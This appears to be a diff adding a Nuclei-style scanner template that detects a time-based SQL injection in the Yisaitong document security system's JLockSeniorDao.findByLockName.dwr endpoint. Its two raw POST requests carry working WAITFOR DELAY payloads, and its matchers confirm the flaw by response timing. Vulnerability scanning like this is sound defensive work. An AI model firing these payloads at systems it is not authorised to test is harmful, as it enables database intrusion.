@@ -1,0 +1,64 @@
+id: yisaitong-JLockSeniorDao-findByLockName-dwr-sql-injection
+
+info:
+  name: 亿赛通电子文档安全管理系统 JLockSeniorDao.findByLockName.dwr SQL注入漏洞
+  author: onewin
+  severity: high
+  description: Checks for an SQL injection vulnerability in 亿赛通电子文档安全管理系统 JLockSeniorDao.findByLockName.dwr.
+
+http:
+  - raw:
+    - |-
+      @timeout: 5s
+      POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+      Accept: */*
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Connection: close
+      Content-Type: text/plain
+      Accept-Encoding: gzip
+      Content-Length: 216
+
+      callCount=1
+      page=/CDGServer3/dwr/test/JLockDao
+      httpSessionId=
+      scriptSessionId=
+      c0-scriptName=JLockSeniorDao
+      c0-methodName=findByLockName
+      c0-id=0
+      c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:2'--
+      batchId=0
+
+    - |-
+      @timeout: 10s
+      POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+      Accept: */*
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Connection: close
+      Content-Type: text/plain
+      Accept-Encoding: gzip
+      Content-Length: 216
+
+      callCount=1
+      page=/CDGServer3/dwr/test/JLockDao
+      httpSessionId=
+      scriptSessionId=
+      c0-scriptName=JLockSeniorDao
+      c0-methodName=findByLockName
+      c0-id=0
+      c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:5'--
+      batchId=0
+
+    # 全局匹配规则：两个请求的延迟条件都必须满足
+    matchers:
+      - type: dsl
+        dsl:
+          # 第一个请求（index 0）的延迟≥2秒且<5秒
+          - 'duration_1 >= 2 && duration_1 < 5'
+          # 第二个请求（index 1）的延迟≥5秒且<10秒
+          - 'duration_2 >= 5 && duration_2 < 10'
+        # 两个DSL条件必须同时满足
+        condition: and
